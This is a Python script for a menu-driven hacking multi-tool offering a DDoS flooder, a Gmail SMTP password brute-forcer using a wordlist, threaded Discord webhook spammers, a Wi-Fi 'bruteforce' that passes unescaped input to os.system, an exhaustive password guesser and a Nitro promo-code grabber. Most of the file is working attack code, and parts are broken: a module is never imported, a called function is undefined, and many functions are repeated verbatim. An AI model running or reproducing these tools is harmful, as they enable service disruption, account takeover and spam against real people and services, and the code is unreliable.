﻿import os
import re
import requests
import threading
import time
import socket
import smtplib
import sys
import hashlib
import itertools
import string
from discord_webhook import DiscordWebhook
os.system("color 1")
# ASCII art
ascii_art = """
.▄▄ · ▄▄▄▄▄▄▄▄▄   ▄· ▄▌▄ •▄ ▄▄▄ .  • ▌ ▄ ·. ▄• ▄▌▄▄▌  ▄▄▄▄▄▄▪  ▄▄▄▄▄▄            ▄▄▌  
▐█ ▀. ▀•██ ▀▀▄ █·▐█▪██▌█▌▄▌▪▀▄.▀·  ·██ ▐███▪█▪██▌██•  ▀•██ ▀██ ▀•██ ▀ ▄█▀▄  ▄█▀▄ ██•  
▄▀▀▀█▄  ▐█.▪▐▀▀▄ ▐█▌▐█▪▐▀▀▄·▐▀▀▪▄  ▐█ ▌▐▌▐█·█▌▐█▌██ ▪   ▐█.▪▐█·  ▐█.▪▐█▌.▐▌▐█▌.▐▌██ ▪ 
▐█▄▪▐█  ▐█▌·▐█•█▌ ▐█▀·.▐█.█▌▐█▄▄▌  ██ ██▌▐█▌▐█▄█▌▐█▌ ▄  ▐█▌·▐█▌  ▐█▌·▐█▌.▐▌▐█▌.▐▌▐█▌ ▄
 ▀▀▀▀   ▀▀▀ .▀  ▀  ▀ • ·▀  ▀ ▀▀▀   ▀▀  █▪▀▀▀ ▀▀▀ .▀▀▀   ▀▀▀ ▀▀▀  ▀▀▀  ▀█▄▀▪ ▀█▄▀▪.▀▀▀ 
"""

# Function for DDOS attack
def ddos_attack(target, fake_ip, port, num_threads):
    def attack():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
                s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
                s.close()
            except Exception as e:
                print("Error in DDOS attack:", e)

    # Start the threads
    for _ in range(num_threads):
        thread = threading.Thread(target=attack)
        thread.start()


# Function for Nitro Generator
def nitro_gen():
    url = 'https://api.discord.gx.games/v1/direct-fulfillment'
    headers = {
        'authority': 'api.discord.gx.games',
        'accept': '*/*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://www.opera.com',
        'referer': 'https://www.opera.com/',
        'sec-ch-ua': '"Not A(Brand";v="99", "Opera GX";v="107", "Chromium";v="121"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Hydra Nitro Generator, By Kurby & Raid',
    }
    data = '{"partnerUserId":"a887e1cbab38a2e12ebfbe63e28805fa88d84678264b55ccea819cfd39af815b"}'
    
    try:
        response = requests.post(url, headers=headers, data=data, timeout=10)
        token_match = re.search(r'"token":"([^"]+)"', response.content.decode('utf-8'))
        if token_match:
            token = token_match.group(1)
            url_with_token = f"https://discord.com/billing/partner-promotions/1180231712274387115/{token}"
            print("URL with Token:", url_with_token)
        else:
            print("Token not found in response.")
    except Exception as e:
        print("Error:", e)

# Function to spam requests for 3 minutes
def spam_requests():
    start_time = time.time()
    while time.time() - start_time < 180:  # Run for 3 minutes
        send_request()

# Function for Email Bruteforce
def brute_force_email(user, passwdfile):
    server = 'smtp.gmail.com'
    port = 587

    smtp = smtplib.SMTP(server, port)
    smtp.ehlo()
    smtp.starttls()

    def connect(user, passwd):
        try:
            smtp.login(user, passwd)
            print('[*] Password found: %s' % (passwd))
            return True
        except:
            print('[*] Attempting password %s ' % (passwd))
            return False

    with open(passwdfile, 'r') as file:
        for word in file:
            if connect(user, word.strip()):
                break



# Function for Webhook Spammer
def webhook_spammer(webhook_url, message, num_spams):
    try:
        # Check if the webhook URL is valid
        if not webhook_url.startswith("https://discord.com/api/webhooks/"):
            raise ValueError("Invalid webhook URL")
        
        # Check if the message is empty
        if not message:
            raise ValueError("Message cannot be empty")
        
        # Check if the number of spams is valid
        if num_spams <= 0:
            raise ValueError("Number of spams must be greater than zero")
        
        # Send the spam messages
        for _ in range(num_spams):
            webhook = DiscordWebhook(url=webhook_url, content=message)
            webhook.execute()
        
        return True
    except Exception as e:
        # Log the error
        print(f"Error: {e}")
        return False

# Function for WiFi Bruteforce
def wifi_bruteforce(name, SSID, key):
    config = """<?xml version=\"1.0\"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>"""+name+"""</name>
    <SSIDConfig>
        <SSID>
            <name>"""+SSID+"""</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>"""+key+"""</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""
    if platform.system() == "Windows":
        command = "netsh wlan add profile filename=\""+name+".xml\""+" interface=Wi-Fi"
        with open(name+".xml", 'w') as file:
            file.write(config)
    elif platform.system() == "Linux":
        command = "nmcli dev wifi connect '"+SSID+"' password '"+key+"'"
    os.system(command)
    if platform.system() == "Windows":
        os.remove(name+".xml")

# Function for Bitcoin Mining
def mine_block(block_number, previous_hash, transactions, difficulty):
    prefix = '0' * difficulty
    start_time = time.time()
    for nonce in range(2**32):
        data = str(block_number) + previous_hash + transactions + str(nonce)
        hash_result = hashlib.sha256(data.encode()).hexdigest()
        if hash_result.startswith(prefix):
            mining_time = time.time() - start_time
            print(f"Block mined! Nonce: {nonce}, Hash: {hash_result}, Mining Time: {mining_time} seconds")
            return hash_result

# Function to generate and test all possible passwords
def guess_password(real):
    chars = string.ascii_lowercase + string.digits
    attempts = 0
    for password_length in range(8, 9):
        for guess in itertools.product(chars, repeat=password_length):
            attempts += 1
            guess = ''.join(guess)
            if guess == real:
                return 'password is {}. found in {} guesses.'.format(guess, attempts)
            print(guess, attempts)

# Function for Webhook Spammer
def webhook_spammer_fast(webhook_url, message, num_spams):
    try:
        # Check if the webhook URL is valid
        if not webhook_url.startswith("https://discord.com/api/webhooks/"):
            raise ValueError("Invalid webhook URL")
        
        # Check if the message is empty
        if not message:
            raise ValueError("Message cannot be empty")
        
        # Check if the number of spams is valid
        if num_spams <= 0:
            raise ValueError("Number of spams must be greater than zero")
        
        # Send the spam messages
        for _ in range(num_spams):
            webhook = DiscordWebhook(url=webhook_url, content=message)
            threading.Thread(target=webhook.execute).start()
        
        return True
    except Exception as e:
        # Log the error
        print(f"Error: {e}")
        return False

# Function for Bitcoin Mining
def mine_block_advanced(previous_block_hash, transactions, difficulty):
    nonce = 0
    while True:
        block_data = str(nonce) + previous_block_hash + transactions
        block_hash = hashlib.sha256(block_data.encode()).hexdigest()
        
        # Check if the block hash meets the difficulty criteria
        if block_hash[:difficulty] == '0' * difficulty:
            return block_hash
        
        nonce += 1

# Function for Bitcoin Mining Simulation
def mine_block_simulation(previous_block_hash, transactions, difficulty):
    nonce = 0
    while True:
        block_data = str(nonce) + previous_block_hash + transactions
        block_hash = hashlib.sha256(block_data.encode()).hexdigest()
        
        # Check if the block hash meets the difficulty criteria
        if block_hash[:difficulty] == '0' * difficulty:
            return block_hash
        
        nonce += 1

# Function for Email Bruteforce
def brute_force_email_v2(user, passwdfile):
    server = 'smtp.gmail.com'
    port = 587

    smtp = smtplib.SMTP(server, port)
    smtp.ehlo()
    smtp.starttls()

    def connect(user, passwd):
        try:
            smtp.login(user, passwd)
            print('[*] Password found: %s' % (passwd))
            return True
        except:
            print('[*] Attempting password %s ' % (passwd))
            return False

    with open(passwdfile, 'r') as file:
        for word in file:
            if connect(user, word.strip()):
                break

# Function for WiFi Bruteforce
def wifi_bruteforce_v2(name, SSID, key):
    config = """<?xml version=\"1.0\"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>"""+name+"""</name>
    <SSIDConfig>
        <SSID>
            <name>"""+SSID+"""</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>"""+key+"""</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""
    if platform.system() == "Windows":
        command = "netsh wlan add profile filename=\""+name+".xml\""+" interface=Wi-Fi"
        with open(name+".xml", 'w') as file:
            file.write(config)
    elif platform.system() == "Linux":
        command = "nmcli dev wifi connect '"+SSID+"' password '"+key+"'"
    os.system(command)
    if platform.system() == "Windows":
        os.remove(name+".xml")

# Function for Bitcoin Mining
def mine_block_v2(block_number, previous_hash, transactions, difficulty):
    prefix = '0' * difficulty
    start_time = time.time()
    for nonce in range(2**32):
        data = str(block_number) + previous_hash + transactions + str(nonce)
        hash_result = hashlib.sha256(data.encode()).hexdigest()
        if hash_result.startswith(prefix):
            mining_time = time.time() - start_time
            print(f"Block mined! Nonce: {nonce}, Hash: {hash_result}, Mining Time: {mining_time} seconds")
            return hash_result

# Function to generate and test all possible passwords
def guess_password_v2(real):
    chars = string.ascii_lowercase + string.digits
    attempts = 0
    for password_length in range(8, 9):
        for guess in itertools.product(chars, repeat=password_length):
            attempts += 1
            guess = ''.join(guess)
            if guess == real:
                return 'password is {}. found in {} guesses.'.format(guess, attempts)
            print(guess, attempts)

# Function for Bitcoin Mining Simulation
def mine_block_simulation_v2(previous_block_hash, transactions, difficulty):
    nonce = 0
    while True:
        block_data = str(nonce) + previous_block_hash + transactions
        block_hash = hashlib.sha256(block_data.encode()).hexdigest()
        
        # Check if the block hash meets the difficulty criteria
        if block_hash[:difficulty] == '0' * difficulty:
            return block_hash
        
        nonce += 1

# Function for Webhook Spammer
def webhook_spammer_fast_v2(webhook_url, message, num_spams):
    try:
        # Check if the webhook URL is valid
        if not webhook_url.startswith("https://discord.com/api/webhooks/"):
            raise ValueError("Invalid webhook URL")
        
        # Check if the message is empty
        if not message:
            raise ValueError("Message cannot be empty")
        
        # Check if the number of spams is valid
        if num_spams <= 0:
            raise ValueError("Number of spams must be greater than zero")
        
        # Send the spam messages
        for _ in range(num_spams):
            webhook = DiscordWebhook(url=webhook_url, content=message)
            threading.Thread(target=webhook.execute).start()
        
        return True
    except Exception as e:
        # Log the error
        print(f"Error: {e}")
        return False

# Function for Bitcoin Mining
def mine_block_advanced_v2(previous_block_hash, transactions, difficulty):
    nonce = 0
    while True:
        block_data = str(nonce) + previous_block_hash + transactions
        block_hash = hashlib.sha256(block_data.encode()).hexdigest()
        
        # Check if the block hash meets the difficulty criteria
        if block_hash[:difficulty] == '0' * difficulty:
            return block_hash
        
        nonce += 1

# Function for Bitcoin Mining Simulation
def mine_block_simulation_v3(previous_block_hash, transactions, difficulty):
    nonce = 0
    while True:
        block_data = str(nonce) + previous_block_hash + transactions
        block_hash = hashlib.sha256(block_data.encode()).hexdigest()
        
        # Check if the block hash meets the difficulty criteria
        if block_hash[:difficulty] == '0' * difficulty:
            return block_hash
        
        nonce += 1

# Function to display menu and handle user choice
def display_menu():
    print(ascii_art)
    print("Select an option:")
    print("1. Nitro Gen")
    print("2. DDOS")
    print("3. Email Bruteforce")
    print("4. Webhook Spammer")
    print("5. WiFi Bruteforce")
    print("6. Bitcoin Mining")
    print("7. Exit")

# Run the program
if __name__ == "__main__":
    while True:
        display_menu()
        option = input("Enter your choice: ")
        
        if option == "1":
            nitro_gen()
        elif option == "2":
            target = input("[INPUT] Target IP: ")
            fake_ip = input("[INPUT] Fake IP: ")
            port = int(input("[INPUT] Port: "))
            num_threads = int(input("[INPUT] Number of threads: "))
            ddos_attack(target, fake_ip, port, num_threads)
        elif option == "3":
            user = input("[INPUT] Email Address: ")
            passwdfile = input("[INPUT] Password List: ")
            brute_force_email(user, passwdfile)
        elif option == "4":
            webhook_url = input("[INPUT] Webhook URL: ")
            message = input("[INPUT] Message to spam: ")
            num_spams = int(input("[INPUT] Number of spams: "))
            webhook_spammer(webhook_url, message, num_spams)
        elif option == "5":
            name = input("[INPUT] Name of the network: ")
            SSID = input("[INPUT] SSID: ")
            key = input("[INPUT] Key: ")
            wifi_bruteforce(name, SSID, key)
        elif option == "6":
            block_number = int(input("[INPUT] Block number: "))
            previous_hash = input("[INPUT] Previous hash: ")
            transactions = input("[INPUT] Transactions: ")
            difficulty = int(input("[INPUT] Difficulty: "))
            mine_block(block_number, previous_hash, transactions, difficulty)
        elif option == "7":
            print("Exiting program...")
            break
        else:
            print("Invalid option. Please try again.")
